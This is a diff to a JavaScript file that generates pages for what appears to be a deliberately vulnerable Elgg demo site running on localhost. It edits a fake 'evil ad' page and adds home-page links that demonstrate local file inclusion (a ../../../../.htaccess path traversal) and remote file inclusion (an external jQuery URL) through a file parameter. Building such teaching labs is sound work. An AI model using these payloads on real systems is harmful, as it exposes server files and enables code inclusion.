@@ -190,9 +190,8 @@ function getEvilAdHtmlCode(){
     str += '</head>';
     str += '<body bgcolor="blue">';
     str += '<br>';
-    str += '<div align="center"><blink> WIN $5000 IN 5 MINUTES! WANT TO KNOW HOW?</blink>';
+    str += '<div align="center" class="test"><blink> WIN $5000 IN 5 MINUTES! WANT TO KNOW HOW?</blink>';
     str += '<input type="button" value="CLICK HERE!" id="adclickbutton" onclick="postmessagetoparent()"/></div>';
-    str += '<div id="test"></div>';
     str += '</body>';
     str += '</html>';
     return str;
@@ -253,6 +252,23 @@ function getHomePageHtmlCode(){
     str += '</div>';
     str += '</a>';
 
+    str += '<a href="http://localhost/elgg/mod/ads/views/default/showlinks.php?file=../../../../.htaccess" class="mylink">';
+    str += '<div class="title">';
+    str += 'Local File Include';
+    str += '</div>';
+    str += '<div class="desc">';
+    str += 'Modifying the query parameter exposes .htaccess';
+    str += '</div>';
+    str += '</a>';
+
+    str += '<a href="http://localhost/elgg/mod/ads/views/default/showlinks.php?file=http://code.jquery.com/jquery-1.11.0.min.js" class="mylink">';
+    str += '<div class="title">';
+    str += 'Remote File Include';
+    str += '</div>';
+    str += '<div class="desc">';
+    str += 'Modifying the query parameter displays external file jquery.js';
+    str += '</div>';
+    str += '</a>';
 
     str += '</div>';
     str += '</body>    ';
